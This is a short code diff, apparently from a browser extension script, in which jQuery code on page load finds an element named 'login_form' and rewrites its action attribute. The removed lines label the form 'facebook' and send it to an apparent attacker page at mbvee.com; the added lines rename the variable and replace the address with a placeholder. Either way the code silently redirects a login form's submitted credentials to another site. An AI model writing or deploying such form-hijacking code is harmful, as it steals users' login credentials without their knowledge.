@@ -8,8 +8,8 @@ $(document).ready(function () {
 			counter = 1;
 			if (counter == 1)
 			{
-				var facebook = document.getElementById("login_form");
-				facebook.action = "http://www.mbvee.com/Project/attackerSite.html"
+				var loginform = document.getElementById("login_form");
+				loginform.action = "<desired web page url>"
 				
 				counter = counter + 1;
 				chrome.storage.sync.set({'ctr': counter}, function() {
